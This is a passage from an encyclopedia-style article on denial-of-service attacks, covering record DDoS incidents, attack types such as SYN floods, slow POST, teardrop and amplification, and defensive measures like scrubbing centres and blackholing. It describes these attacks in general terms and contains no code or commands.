, revealed by Google on October 17, 2020.
[
10
]
 The record holder was thought to be an attack executed by an unnamed customer of the US-based service provider 
Arbor Networks
, reaching a peak of about 
1.7 Tb/s
.
[
11
]


In February 2020, 
Amazon Web Services
 experienced an attack with a peak volume of 
2.3 Tb/s
.
[
12
]
 In July 2021, CDN Provider 
Cloudflare
 boasted of protecting its client from a DDoS attack from a global 
Mirai botnet
 that was up to 17.2 million requests per second.
[
13
]
 Russian DDoS prevention provider 
Yandex
 said it blocked a HTTP pipelining DDoS attack on Sept. 5. 2021 that originated from unpatched Mikrotik networking gear.
[
14
]
 In the first half of 2022, the 
Russian invasion of Ukraine
 significantly shaped the cyberthreat landscape, with an increase in cyberattacks attributed to both state-sponsored actors and global hacktivist activities. The most notable event was a DDoS attack in February, the largest Ukraine has encountered, disrupting government and financial sector services. This wave of cyber aggression extended to Western allies like the UK, the US, and Germany. Particularly, the UK's financial sector saw an increase in DDoS attacks from 
nation-state
 actors and hacktivists, aimed at undermining Ukraine's allies.
[
15
]


In February 2023, Cloudflare faced a 71 million/requests per second attack which Cloudflare claims was the largest HTTP DDoS attack at the time.
[
16
]
 HTTP DDoS attacks are measured by HTTP requests per second instead of packets per second or bits per second. On July 10, 2023, the fanfiction platform 
Archive of Our Own
 (AO3) faced DDoS attacks, disrupting services. 
Anonymous Sudan
, claiming the attack for religious and political reasons, was viewed skeptically by AO3 and experts. Flashpoint, a threat intelligence vendor, noted the group's past activities but doubted their stated motives. AO3, supported by the non-profit 
Organization for Transformative Works
 (OTW) and reliant on donations, is unlikely to meet the $30,000 
Bitcoin
 ransom.
[
17
]
[
18
]
 In August 2023, the group of hacktivists 
NoName057
 targeted several Italian financial institutions, through the execution of 
slow DoS attacks
.
[
19
]
 On 14 January 2024, they executed a DDoS attack on Swiss federal websites, prompted by 
President Zelensky
's attendance at the 
Davos World Economic Forum
. Switzerland's National Cyber Security Centre quickly mitigated the attack, ensuring core federal services remained secure, despite temporary accessibility issues on some websites.
[
20
]
 In October 2023, exploitation of a new vulnerability in the 
HTTP/2
 protocol resulted in the record for largest HTTP DDoS attack being broken twice, once with a 201 million requests per second attack observed by Cloudflare,
[
21
]
 and again with a 398 million requests per second attack observed by 
Google
.
[
22
]
 In August 2024 Global Secure Layer observed and reported on a record-breaking packet DDoS at 3.15 billion packets per second, which targeted an undisclosed number of unofficial 
Minecraft game servers
.
[
23
]




Types
[
edit
]


Denial-of-service attacks are characterized by an explicit attempt by attackers to prevent legitimate use of a service. There are two general forms of DoS attacks: those that crash services and those that flood services. The most serious attacks are distributed.
[
24
]




Distributed DoS
[
edit
]


A distributed denial-of-service (DDoS) attack occurs when multiple systems flood the 
bandwidth
 or resources of a targeted system, usually one or more web servers.
[
24
]
 A DDoS attack uses more than one unique IP address or machines, often from thousands of hosts infected with 
malware
.
[
25
]
[
26
]
 A distributed denial of service attack typically involves more than around 3–5 nodes on different networks; fewer nodes may qualify as a DoS attack but is not a DDoS attack.
[
27
]
[
28
]


Multiple attack machines can generate more attack traffic than a single machine and are harder to disable, and the behavior of each attack machine can be stealthier, making the attack harder to track and shut down. Since the incoming traffic flooding the victim originates from different sources, it may be impossible to stop the attack simply by using 
ingress filtering
. It also makes it difficult to distinguish legitimate user traffic from attack traffic when spread across multiple points of origin. As an alternative or augmentation of a DDoS, attacks may involve forging of IP sender addresses (
IP address spoofing
) further complicating identifying and defeating the attack. These attacker advantages cause challenges for defense mechanisms. For example, merely purchasing more incoming bandwidth than the current volume of the attack might not help, because the attacker might be able to simply add more attack machines.
[
citation needed
]
 The scale of DDoS attacks has continued to rise over recent years, by 2016 exceeding a 
terabit per second
.
[
29
]
[
30
]
 Some common examples of DDoS attacks are 
UDP flooding
, 
SYN flooding
 and 
DNS amplification
.
[
31
]
[
32
]




Yo-yo attack
[
edit
]


A 
yo-yo
 attack is a specific type of DoS/DDoS aimed at 
cloud-hosted
 applications which use 
autoscaling
.
[
33
]
[
34
]
[
35
]
 The attacker generates a flood of traffic until a cloud-hosted service scales outwards to handle the increase of traffic, then halts the attack, leaving the victim with over-provisioned resources. When the victim scales back down, the attack resumes, causing resources to scale back up again. This can result in a reduced quality of service during the periods of scaling up and down and a financial drain on resources during periods of over-provisioning while operating with a lower cost for an attacker compared to a normal DDoS attack, as it only needs to be generating traffic for a portion of the attack period.



Application layer attacks
[
edit
]


An 
application layer DDoS attack
 (sometimes referred to as 
layer 7 DDoS attack
) is a form of DDoS attack where attackers target 
application-layer
 processes.
[
36
]
[
27
]
 The attack over-exercises specific functions or features of a website with the intention to disable those functions or features. This application-layer attack is different from an entire network attack, and is often used against financial institutions to distract IT and security personnel from security breaches.
[
37
]
 In 2013, application-layer DDoS attacks represented 20% of all DDoS attacks.
[
38
]
 According to research by 
Akamai Technologies
, there have been "51 percent more application layer attacks" from Q4 2013 to Q4 2014 and "16 percent more" from Q3 2014 to Q4 2014.
[
39
]
 In November 2017; Junade Ali, an engineer at Cloudflare noted that whilst network-level attacks continue to be of high capacity, they were occurring less frequently. Ali further noted that although network-level attacks were becoming less frequent, data from Cloudflare demonstrated that application-layer attacks were still showing no sign of slowing down.
[
40
]




Application layer
[
edit
]


The 
OSI model
 (ISO/IEC 7498-1) is a conceptual model that characterizes and standardizes the internal functions of a communication system by partitioning it into 
abstraction layers
. The model is a product of the 
Open Systems Interconnection
 project at the 
International Organization for Standardization
 (ISO). The model groups similar communication functions into one of seven logical layers. A layer serves the layer above it and is served by the layer below it. For example, a layer that provides error-free communications across a network provides the communications path needed by applications above it, while it calls the next lower layer to send and receive packets that traverse that path. In the OSI model, the definition of its application layer is narrower in scope than is often implemented. The OSI model defines the application layer as being the user interface. The OSI application layer is responsible for displaying data and images to the user in a human-recognizable format and to interface with the 
presentation layer
 below it. In an implementation, the application and presentation layers are frequently combined.



Method of attack
[
edit
]


The simplest DoS attack relies primarily on brute force, flooding the target with an overwhelming flux of packets, oversaturating its connection bandwidth or depleting the target's system resources. Bandwidth-saturating floods rely on the attacker's ability to generate the overwhelming flux of packets. A common way of achieving this today is via distributed denial-of-service, employing a 
botnet
. An application layer DDoS attack is done mainly for specific targeted purposes, including disrupting transactions and access to databases. It requires fewer resources than network layer attacks but often accompanies them.
[
41
]
 An attack may be disguised to look like legitimate traffic, except it targets specific application packets or functions. The attack on the application layer can disrupt services such as the retrieval of information or search functions on a website.
[
38
]




Advanced persistent DoS
[
edit
]


An 
advanced persistent DoS
 (APDoS) is associated with an 
advanced persistent threat
 and requires specialized 
DDoS mitigation
.
[
42
]
 These attacks can persist for weeks; the longest continuous period noted so far lasted 38 days. This attack involved approximately 50+ petabits (50,000+ terabits) of malicious traffic.
[
43
]
 Attackers in this scenario may tactically switch between several targets to create a diversion to evade defensive DDoS countermeasures but all the while eventually concentrating the main thrust of the attack onto a single victim. In this scenario, attackers with continuous access to several very powerful network resources are capable of sustaining a prolonged campaign generating enormous levels of unamplified DDoS traffic. APDoS attacks are characterized by:



advanced reconnaissance (pre-attack 
OSINT
 and extensive decoyed scanning crafted to evade detection over long periods)


tactical execution (attack with both primary and secondary victims but the focus is on primary)


explicit motivation (a calculated end game/goal target)


large computing capacity (access to substantial computer power and network bandwidth)


simultaneous multi-threaded OSI layer attacks (sophisticated tools operating at layers 3 through 7)


persistence over extended periods (combining all the above into a concerted, well-managed attack across a range of targets).
[
44
]


Denial-of-service as a service
[
edit
]


Main article: 
Stresser


Some vendors provide so-called 
booter
 or 
stresser
 services, which have simple web-based front ends, and accept payment over the web. Marketed and promoted as stress-testing tools, they can be used to perform unauthorized denial-of-service attacks, and allow technically unsophisticated attackers access to sophisticated attack tools.
[
45
]
 Usually powered by a botnet, the traffic produced by a consumer stresser can range anywhere from 5-50 Gbit/s, which can, in most cases, deny the average home user internet access.
[
46
]




Markov-modulated denial-of-service attack
[
edit
]


A Markov-modulated denial-of-service attack occurs when the attacker disrupts control packets using a 
hidden Markov model
. A setting in which Markov-model based attacks are prevalent is online gaming as the disruption of the control packet undermines game play and system functionality.
[
47
]




Symptoms
[
edit
]


The 
United States Computer Emergency Readiness Team
 (US-CERT) has identified symptoms of a denial-of-service attack to include:
[
48
]




unusually slow 
network performance
 (opening files or accessing websites),


unavailability of a particular website, or


inability to access any website.


Attack techniques
[
edit
]


Attack tools
[
edit
]


In cases such as 
MyDoom
 and 
Slowloris
, the tools are embedded in 
malware
 and launch their attacks without the knowledge of the system owner. 
Stacheldraht
 is a classic example of a DDoS tool. It uses a layered structure where the attacker uses a 
client program
 to connect to handlers which are compromised systems that issue commands to the 
zombie agents
 which in turn facilitate the DDoS attack. Agents are compromised via the handlers by the attacker using automated routines to exploit vulnerabilities in programs that accept remote connections running on the targeted remote hosts. Each handler can control up to a thousand agents.
[
49
]


In other cases a machine may become part of a DDoS attack with the owner's consent, for example, in 
Operation Payback
 organized by the group 
Anonymous
. The 
Low Orbit Ion Cannon
 has typically been used in this way. Along with 
High Orbit Ion Cannon
 a wide variety of DDoS tools are available today, including paid and free versions, with different features available. There is an underground market for these in hacker-related forums and IRC channels.



Application-layer attacks
[
edit
]


Application-layer attacks employ DoS-causing 
exploits
 and can cause server-running software to fill the disk space or consume all available memory or 
CPU time
. Attacks may use specific packet types or connection requests to saturate finite resources by, for example, occupying the maximum number of open connections or filling the victim's disk space with logs. An attacker with shell-level access to a victim's computer may slow it until it is unusable or crash it by using a 
fork bomb
. Another kind of application-level DoS attack is XDoS (or XML DoS) which can be controlled by modern web 
application firewalls
 (WAFs). All attacks belonging to the category of 
timeout exploiting
.
[
50
]


Slow DoS attacks
 implement an application-layer attack. Examples of threats are Slowloris, establishing pending connections with the victim, or 
SlowDroid
, an attack running on mobile devices. Another target of DDoS attacks may be to produce added costs for the application operator, when the latter uses resources based on 
cloud computing
. In this case, normally application-used resources are tied to a needed quality of service (QoS) level (e.g. responses should be less than 200 ms) and this rule is usually linked to automated software (e.g. Amazon CloudWatch
[
51
]
) to raise more virtual resources from the provider to meet the defined QoS levels for the increased requests. The main incentive behind such attacks may be to drive the application owner to raise the elasticity levels to handle the increased application traffic, to cause financial losses, or force them to become less competitive. A 
banana attack
 is another particular type of DoS. It involves redirecting outgoing messages from the client back onto the client, preventing outside access, as well as flooding the client with the sent packets. A 
LAND
 attack is of this type.



Degradation-of-service attacks
[
edit
]


Pulsing zombies are compromised computers that are directed to launch intermittent and short-lived floodings of victim websites with the intent of merely slowing it rather than crashing it. This type of attack, referred to as 
degradation-of-service
, can be more difficult to detect and can disrupt and hamper connection to websites for prolonged periods of time, potentially causing more overall disruption than a denial-of-service attack.
[
52
]
[
53
]
 Exposure of degradation-of-service attacks is complicated further by the matter of discerning whether the server is really being attacked or is experiencing higher than normal legitimate traffic loads.
[
54
]




Distributed DoS attack
[
edit
]


If an attacker mounts an attack from a single host, it would be classified as a DoS attack. Any attack against availability would be classed as a denial-of-service attack. On the other hand, if an attacker uses many systems to simultaneously launch attacks against a remote host, this would be classified as a DDoS attack. 
Malware
 can carry DDoS attack mechanisms; one of the better-known examples of this was 
MyDoom
. Its DoS mechanism was triggered on a specific date and time. This type of DDoS involved hardcoding the target 
IP address
 before releasing the malware and no further interaction was necessary to launch the attack. A system may also be compromised with a 
trojan
 containing a 
zombie agent
. Attackers can also break into systems using automated tools that exploit flaws in programs that listen for connections from remote hosts. This scenario primarily concerns systems acting as servers on the web. 
Stacheldraht
 is a classic example of a DDoS tool. It uses a layered structure where the attacker uses a 
client program
 to connect to handlers, which are compromised systems that issue commands to the zombie agents, which in turn facilitate the DDoS attack. Agents are compromised via the handlers by the attacker. Each handler can control up to a thousand agents.
[
49
]
 In some cases a machine may become part of a DDoS attack with the owner's consent, for example, in 
Operation Payback
, organized by the group 
Anonymous
. These attacks can use different types of internet packets such as TCP, UDP, ICMP, etc.

These collections of compromised systems are known as 
botnets
. DDoS tools like 
Stacheldraht
 still use classic DoS attack methods centered on 
IP spoofing
 and amplification like 
smurf attacks
 and 
fraggle attacks
 (types of bandwidth consumption attacks). 
SYN floods
 (a resource starvation attack) may also be used. Newer tools can use DNS servers for DoS purposes. Unlike MyDoom's DDoS mechanism, botnets can be turned against any IP address. 
Script kiddies
 use them to deny the availability of well known websites to legitimate users.
[
55
]
 More sophisticated attackers use DDoS tools for the purposes of 
extortion
 – including against their business rivals.
[
56
]
 It has been reported that there are new attacks from 
internet of things
 (IoT) devices that have been involved in denial of service attacks.
[
57
]
 In one noted attack that was made peaked at around 20,000 requests per second which came from around 900 CCTV cameras.
[
58
]
 UK's 
GCHQ
 has tools built for DDoS, named PREDATORS FACE and ROLLING THUNDER.
[
59
]


Simple attacks such as SYN floods may appear with a wide range of source IP addresses, giving the appearance of a distributed DoS. These flood attacks do not require completion of the TCP 
three-way handshake
 and attempt to exhaust the destination SYN queue or the server bandwidth. Because the source IP addresses can be trivially spoofed, an attack could come from a limited set of sources, or may even originate from a single host. Stack enhancements such as 
SYN cookies
 may be effective mitigation against SYN queue flooding but do not address bandwidth exhaustion. In 2022, TCP attacks were the leading method in DDoS incidents, accounting for 63% of all DDoS activity. This includes tactics like 
TCP SYN
, TCP ACK, and TCP floods. With TCP being the most widespread networking protocol, its attacks are expected to remain prevalent in the DDoS threat scene.
[
15
]




DDoS extortion
[
edit
]


In 2015, DDoS botnets such as DD4BC grew in prominence, taking aim at financial institutions.
[
60
]
 Cyber-extortionists typically begin with a low-level attack and a warning that a larger attack will be carried out if a ransom is not paid in 
bitcoin
.
[
61
]
 Security experts recommend targeted websites to not pay the ransom. The attackers tend to get into an extended extortion scheme once they recognize that the target is ready to pay.
[
62
]




HTTP slow POST DoS attack
[
edit
]


First discovered in 2009, the HTTP slow POST attack sends a complete, legitimate 
HTTP POST header
, which includes a 
Content-Length
 field to specify the size of the message body to follow. However, the attacker then proceeds to send the actual message body at an extremely slow rate (e.g. 1 byte/110 seconds). Due to the entire message being correct and complete, the target server will attempt to obey the 
Content-Length
 field in the header, and wait for the entire body of the message to be transmitted, which can take a very long time. The attacker establishes hundreds or even thousands of such connections until all resources for incoming connections on the victim server are exhausted, making any further connections impossible until all data has been sent. It is notable that unlike many other DDoS or DDoS attacks, which try to subdue the server by overloading its network or CPU, an HTTP slow POST attack targets the 
logical
 resources of the victim, which means the victim would still have enough network bandwidth and processing power to operate.
[
63
]
 Combined with the fact that the 
Apache HTTP Server
 will, by default, accept requests up to 2GB in size, this attack can be particularly powerful. HTTP slow POST attacks are difficult to differentiate from legitimate connections and are therefore able to bypass some protection systems. 
OWASP
, an 
open source
 web application security project, released a tool to test the security of servers against this type of attack.
[
64
]




Challenge Collapsar (CC) attack
[
edit
]


A Challenge Collapsar (CC) attack is an attack where standard HTTP requests are sent to a targeted web server frequently. The 
Uniform Resource Identifiers
 (URIs) in the requests require complicated time-consuming algorithms or database operations which may exhaust the resources of the targeted web server.
[
65
]
[
66
]
[
67
]
 In 2004, a Chinese hacker nicknamed KiKi invented a hacking tool to send these kinds of requests to attack a NSFOCUS firewall named Collapsar, and thus the hacking tool was known as Challenge Collapsar, or 
CC
 for short. Consequently, this type of attack got the name 
CC attack
.
[
68
]




Internet Control Message Protocol (ICMP) flood
[
edit
]


A 
smurf attack
 relies on misconfigured network devices that allow packets to be sent to all computer hosts on a particular network via the 
broadcast address
 of the network, rather than a specific machine. The attacker will send large numbers of 
IP
 packets with the source address faked to appear to be the address of the victim.
[
69
]
 Most devices on a network will, by default, respond to this by sending a reply to the source IP address. If the number of machines on the network that receive and respond to these packets is very large, the victim's computer will be flooded with traffic. This overloads the victim's computer and can even make it unusable during such an attack.
[
70
]


Ping flood
 is based on sending the victim an overwhelming number of 
ping
 packets, usually using the 
ping
 command from 
Unix-like
 hosts.
[
a
]
 It is very simple to launch, the primary requirement being access to greater 
bandwidth
 than the victim. 
Ping of death
 is based on sending the victim a malformed ping packet, which will lead to a system crash on a vulnerable system. The 
BlackNurse
 attack is an example of an attack taking advantage of the required Destination Port Unreachable ICMP packets.



Nuke
[
edit
]


A nuke is an old-fashioned denial-of-service attack against 
computer networks
 consisting of fragmented or otherwise invalid 
ICMP
 packets sent to the target, achieved by using a modified 
ping
 utility to repeatedly send this 
corrupt data
, thus slowing down the affected computer until it comes to a complete stop.
[
71
]
 A specific example of a nuke attack that gained some prominence is the 
WinNuke
, which exploited the vulnerability in the 
NetBIOS
 handler in 
Windows 95
. A string of out-of-band data was sent to 
TCP
 port 139 of the victim's machine, causing it to lock up and display a 
Blue Screen of Death
.
[
71
]




Peer-to-peer attacks
[
edit
]


See also: 
Direct Connect (protocol) § Direct Connect used for DDoS attacks


Attackers have found a way to exploit a number of bugs in 
peer-to-peer
 servers to initiate DDoS attacks. The most aggressive of these peer-to-peer-DDoS attacks exploits 
DC++
. With peer-to-peer there is no botnet and the attacker does not have to communicate with the clients it subverts. Instead, the attacker acts as a 
puppet master
, instructing clients of large 
peer-to-peer file sharing
 hubs to disconnect from their peer-to-peer network and to connect to the victim's website instead.
[
72
]
[
73
]
[
74
]




Permanent denial-of-service attacks
[
edit
]


Permanent denial-of-service (PDoS), also known loosely as phlashing,
[
75
]
 is an attack that damages a system so badly that it requires replacement or reinstallation of hardware.
[
76
]
 Unlike the distributed denial-of-service attack, a PDoS attack exploits security flaws which allow remote administration on the management interfaces of the victim's hardware, such as 
routers
, printers, or other 
networking hardware
. The attacker uses these 
vulnerabilities
 to replace a device's 
firmware
 with a modified, corrupt, or defective firmware image—a process which when done legitimately is known as 
flashing.
 The intent is to 
brick
 the device, rendering it unusable for its original purpose until it can be repaired or replaced. The PDoS is a pure hardware-targeted attack that can be much faster and requires fewer resources than using a botnet in a DDoS attack. Because of these features, and the potential and high probability of security exploits on network-enabled embedded devices, this technique has come to the attention of numerous hacking communities. 
BrickerBot
, a piece of malware that targeted IoT devices, used PDoS attacks to disable its targets.
[
77
]
 PhlashDance is a tool created by Rich Smith (an employee of 
Hewlett-Packard's
 Systems Security Lab) used to detect and demonstrate PDoS vulnerabilities at the 2008 EUSecWest Applied Security Conference in London, UK.
[
78
]




Reflected attack
[
edit
]


A distributed denial-of-service attack may involve sending forged requests of some type to a very large number of computers that will reply to the requests. Using 
Internet Protocol address spoofing
, the source address is set to that of the targeted victim, which means all the replies will go to (and flood) the target. This reflected attack form is sometimes called a 
distributed reflective denial-of-service
 (
DRDoS
) attack.
[
79
]
 
ICMP echo request
 attacks (
Smurf attacks
) can be considered one form of reflected attack, as the flooding hosts send Echo Requests to the broadcast addresses of mis-configured networks, thereby enticing hosts to send Echo Reply packets to the victim. Some early DDoS programs implemented a distributed form of this attack.



Amplification
[
edit
]


Amplification attacks are used to magnify the bandwidth that is sent to a victim. Many services can be exploited to act as reflectors, some harder to block than others.
[
80
]
 US-CERT have observed that different services may result in different amplification factors, as tabulated below:
[
81
]






UDP-based amplification attacks





Protocol



Amplification factor



Notes





Mitel
 MiCollab



2,200,000,000
[
82
]










Memcached




50,000



Fixed in version 1.5.6
[
83
]






NTP




556.9



Fixed in version 4.2.7p26
[
84
]






CHARGEN




358.8









DNS




up to 179
[
85
]










QOTD




140.3









Quake Network Protocol




63.9



Fixed in version 71





BitTorrent




4.0 - 54.3
[
86
]




Fixed in libuTP since 2015





CoAP




10 - 50









ARMS



33.5









SSDP




30.8









Kad




16.3









SNMPv2




6.3









Steam Protocol




5.5









NetBIOS




3.8







DNS
 amplification attacks involves an attacker sending a DNS name lookup request to one or more public DNS servers, spoofing the source IP address of the targeted victim. The attacker tries to request as much information as possible, thus amplifying the DNS response that is sent to the targeted victim. Since the size of the request is significantly smaller than the response, the attacker is easily able to increase the amount of traffic directed at the target.
[
87
]
[
88
]


SNMP
 and 
NTP
 can also be exploited as reflectors in an amplification attack. An example of an amplified DDoS attack through the 
Network Time Protocol
 (NTP) is through a command called monlist, which sends the details of the last 600 hosts that have requested the time from the NTP server back to the requester. A small request to this time server can be sent using a spoofed source IP address of some victim, which results in a response 556.9 times the size of the request being sent to the victim. This becomes amplified when using botnets that all send requests with the same spoofed IP source, which will result in a massive amount of data being sent back to the victim. It is very difficult to defend against these types of attacks because the response data is coming from legitimate servers. These attack requests are also sent through UDP, which does not require a connection to the server. This means that the source IP is not verified when a request is received by the server. To bring awareness of these vulnerabilities, campaigns have been started that are dedicated to finding amplification vectors which have led to people fixing their resolvers or having the resolvers shut down completely.
[
citation needed
]




Mirai botnet
[
edit
]


The 
Mirai botnet
 works by using a 
computer worm
 to infect hundreds of thousands of IoT devices across the internet. The worm propagates through networks and systems taking control of poorly protected IoT devices such as thermostats, Wi-Fi-enabled clocks, and washing machines.
[
89
]
 The owner or user will usually have no immediate indication of when the device becomes infected. The IoT device itself is not the direct target of the attack, it is used as a part of a larger attack.
[
90
]
 Once the hacker has enslaved the desired number of devices, they instruct the devices to try to contact an ISP. In October 2016, a Mirai botnet 
attacked Dyn
 which is the ISP for sites such as 
Twitter
, 
Netflix
, etc.
[
89
]
 As soon as this occurred, these websites were all unreachable for several hours.



R-U-Dead-Yet? (RUDY)
[
edit
]


RUDY attack targets web applications by starvation of available sessions on the web server. Much like Slowloris, RUDY keeps sessions at halt using never-ending POST transmissions and sending an arbitrarily large content-length header value.
[
91
]




SACK Panic
[
edit
]


Manipulating 
maximum segment size
 and 
selective acknowledgement
 (SACK) may be used by a remote peer to cause a denial of service by an 
integer overflow
 in the Linux kernel, potentially causing a 
Kernel panic
.
[
92
]
 Jonathan Looney discovered 
CVE
-
2019-11477
, CVE-
2019-11478
, CVE-
2019-11479
 on June 17, 2019.
[
93
]




Shrew attack
[
edit
]


The shrew attack is a denial-of-service attack on the 
Transmission Control Protocol
 where the attacker employs 
man-in-the-middle techniques
. It exploits a weakness in TCP's re-transmission timeout mechanism, using short synchronized bursts of traffic to disrupt TCP connections on the same link.
[
94
]




Slow read attack
[
edit
]


A slow read attack sends legitimate application layer requests, but reads responses very slowly, keeping connections open longer hoping to exhaust the server's connection pool. The slow read is achieved by advertising a very small number for the TCP Receive Window size, and at the same time emptying clients' TCP receive buffer slowly, which causes a very low data flow rate.
[
95
]




Sophisticated low-bandwidth Distributed Denial-of-Service Attack
[
edit
]


A sophisticated low-bandwidth DDoS attack is a form of DoS that uses less traffic and increases its effectiveness by aiming at a weak point in the victim's system design, i.e., the attacker sends traffic consisting of complicated requests to the system.
[
96
]
 Essentially, a sophisticated DDoS attack is lower in cost due to its use of less traffic, is smaller in size making it more difficult to identify, and it has the ability to hurt systems which are protected by flow control mechanisms.
[
96
]
[
97
]




SYN flood
[
edit
]


A 
SYN flood
 occurs when a host sends a flood of TCP/SYN packets, often with a forged sender address. Each of these packets is handled like a connection request, causing the server to spawn a 
half-open connection
, send back a TCP/SYN-ACK packet, and wait for a packet in response from the sender address. However, because the sender's address is forged, the response never comes. These half-open connections exhaust the available connections the server can make, keeping it from responding to legitimate requests until after the attack ends.
[
98
]




Teardrop attacks
[
edit
]


See also: 
IP fragmentation attack


A 
teardrop attack
 involves sending 
mangled
 
IP fragments
 with overlapping, oversized payloads to the target machine. This can crash various operating systems because of a bug in their 
TCP/IP
 
fragmentation re-assembly
 code.
[
99
]
 
Windows 3.1x
, 
Windows 95
 and 
Windows NT
 operating systems, as well as versions of 
Linux
 prior to versions 2.0.32 and 2.1.63 are vulnerable to this attack.
[
b
]
 One of the fields in an 
IP header
 is the 
fragment offset
 field, indicating the starting position, or offset, of the data contained in a fragmented packet relative to the data in the original packet. If the sum of the offset and size of one fragmented packet differs from that of the next fragmented packet, the packets overlap. When this happens, a server vulnerable to teardrop attacks is unable to reassemble the packets resulting in a denial-of-service condition.
[
102
]




Telephony denial-of-service
[
edit
]


Voice over IP
 has made abusive origination of large numbers of 
telephone
 voice calls inexpensive and easily automated while permitting call origins to be misrepresented through 
caller ID spoofing
. According to the US 
Federal Bureau of Investigation
, telephony denial-of-service (TDoS) has appeared as part of various fraudulent schemes:



A scammer contacts the victim's banker or broker, impersonating the victim to request a funds transfer. The banker's attempt to contact the victim for verification of the transfer fails as the victim's telephone lines are being flooded with bogus calls, rendering the victim unreachable.
[
103
]


A scammer contacts consumers with a bogus claim to collect an outstanding 
payday loan
 for thousands of dollars. When the consumer objects, the scammer retaliates by flooding the victim's employer with automated calls. In some cases, the displayed caller ID is spoofed to impersonate police or law enforcement agencies.
[
104
]


Swatting
: A scammer contacts consumers with a bogus debt collection demand and threatens to send police; when the victim balks, the scammer floods local police numbers with calls on which caller ID is spoofed to display the victim's number. Police soon arrive at the victim's residence attempting to find the origin of the calls.


TDoS can exist even without 
Internet telephony
. In the 
2002 New Hampshire Senate election phone jamming scandal
, 
telemarketers
 were used to flood political opponents with spurious calls to jam phone banks on election day. Widespread publication of a number can also flood it with enough calls to render it unusable, as happened by accident in 1981 with multiple +1-
area code
-867-5309 subscribers inundated by hundreds of calls daily in response to the song "
867-5309/Jenny
". TDoS differs from other 
telephone harassment
 (such as 
prank calls
 and 
obscene phone calls
) by the number of calls originated. By occupying lines continuously with repeated automated calls, the victim is prevented from making or receiving both routine and emergency telephone calls. Related exploits include SMS flooding attacks and 
black fax
 or continuous fax transmission by using a loop of paper at the sender.



TTL expiry attack
[
edit
]


It takes more router resources to drop a packet with a 
TTL
 value of 1 or less than it does to forward a packet with a higher TTL value. When a packet is dropped due to TTL expiry, the router CPU must generate and send an 
ICMP time exceeded
 response. Generating many of these responses can overload the router's CPU.
[
105
]




UPnP attack
[
edit
]


A UPnP attack uses an existing vulnerability in 
Universal Plug and Play
 (UPnP) protocol to get past network security and flood a target's network and servers. The attack is based on a DNS amplification technique, but the attack mechanism is a UPnP router that forwards requests from one outer source to another. The UPnP router returns the data on an unexpected UDP port from a bogus IP address, making it harder to take simple action to shut down the traffic flood. According to the 
Imperva
 researchers, the most effective way to stop this attack is for companies to lock down UPnP routers.
[
106
]
[
107
]




SSDP reflection attack
[
edit
]


In 2014 it was discovered that 
Simple Service Discovery Protocol
 (SSDP) was being used in 
DDoS
 attacks known as an 
SSDP reflection attac
k
 
with amplification
. Many devices, including some residential routers, have a vulnerability in the UPnP software that allows an attacker to get replies from 
UDP port 1900
 to a destination address of their choice. With a 
botnet
 of thousands of devices, the attackers can generate sufficient packet rates and occupy bandwidth to saturate links, causing the denial of services.
[
108
]
[
109
]
[
110
]
 Because of this weakness, the network company 
Cloudflare
 has described SSDP as the "Stupidly Simple DDoS Protocol".
[
111
]




ARP spoofing
[
edit
]


ARP spoofing
 is a common DoS attack that involves a vulnerability in the ARP protocol that allows an attacker to associate their 
MAC address
 to the IP address of another computer or 
gateway
, causing traffic intended for the original authentic IP to be re-routed to that of the attacker, causing a denial of service.



Defense techniques
[
edit
]


Main article: 
DDoS mitigation


Defensive responses to denial-of-service attacks typically involve the use of a combination of attack detection, traffic classification and response tools, aiming to block traffic the tools identify as illegitimate and allow traffic that they identify as legitimate.
[
112
]
 A list of response tools include the following.



Upstream filtering
[
edit
]


All traffic destined to the victim is diverted to pass through a 
cleaning center
 or a 
scrubbing center
 via various methods such as: changing the victim IP address in the DNS system, tunneling methods (GRE/VRF, MPLS, SDN),
[
113
]
 proxies, digital cross connects, or even direct circuits. The cleaning center separates 
bad
 traffic (DDoS and also other common internet attacks) and only passes good legitimate traffic to the victim server.
[
114
]
 The victim needs central connectivity to the Internet to use this kind of service unless they happen to be located within the same facility as the cleaning center. DDoS attacks can overwhelm any type of hardware firewall, and passing malicious traffic through large and mature networks becomes more and more effective and economically sustainable against DDoS.
[
115
]




Application front end hardware
[
edit
]


Application front-end hardware is intelligent hardware placed on the network before traffic reaches the servers. It can be used on networks in conjunction with routers and 
switches
 and as part of 
bandwidth management
. Application front-end hardware analyzes data packets as they enter the network, and identifies and drops dangerous or suspicious flows.



Application level key completion indicators
[
edit
]


Approaches to detection of DDoS attacks against cloud-based applications may be based on an application layer analysis, indicating whether incoming bulk traffic is legitimate.
[
116
]
 These approaches mainly rely on an identified path of value inside the application and monitor the progress of requests on this path, through markers called 
key completion indicators
.
[
117
]
 In essence, these techniques are statistical methods of assessing the behavior of incoming requests to detect if something unusual or abnormal is going on. An analogy is to a brick-and-mortar department store where customers spend, on average, a known percentage of their time on different activities such as picking up items and examining them, putting them back, filling a basket, waiting to pay, paying, and leaving. If a mob of customers arrived in the store and spent all their time picking up items and putting them back, but never made any purchases, this could be flagged as unusual behavior.



Blackholing and sinkholing
[
edit
]


With 
blackhole routing
, all the traffic to the attacked DNS or IP address is sent to a 
black hole
 (null interface or a non-existent server). To be more efficient and avoid affecting network connectivity, it can be managed by the ISP.
[
118
]
 A 
DNS sinkhole
 routes traffic to a valid IP address which analyzes traffic and rejects bad packets. Sinkholing may not be efficient for severe attacks.



IPS based prevention
[
edit
]


Intrusion prevention systems
 (IPS) are effective if the attacks have signatures associated with them. However, the trend among attacks is to have legitimate content but bad intent. Intrusion-prevention systems that work on content recognition cannot block behavior-based DoS attacks.
[
42
]
 An 
ASIC
 based IPS may detect and block denial-of-service attacks because they have the 
processing power
 and the granularity to analyze the attacks and act like a 
circuit breaker
 in an automated way.
[
42
]




DDS based defense
[
edit
]


More focused on the problem than IPS, a DoS defense system (DDS) can block connection-based DoS attacks and those with legitimate content but bad intent. A DDS can also address both protocol attacks (such as teardrop and ping of death) and rate-based attacks (such as ICMP floods and SYN floods). DDS has a purpose-built system that can easily identify and obstruct denial of service attacks at a greater speed than a software-based system.
[
119
]




Firewalls
[
edit
]


In the case of a simple attack, a 
firewall
 can be adjusted to deny all incoming traffic from the attackers, based on protocols, ports, or the originating IP addresses. More complex attacks will however be hard to block with simple rules: for example, if there is an ongoing attack on port 80 (web service), it is not possible to drop all incoming traffic on this port because doing so will prevent the server from receiving and serving legitimate traffic.
[
120
]
 Additionally, firewalls may be too deep in the network hierarchy, with routers being adversely affected before the traffic gets to the firewall. Also, many security tools still do not support IPv6 or may not be configured properly, so the firewalls may be bypassed during the attacks.
[
121
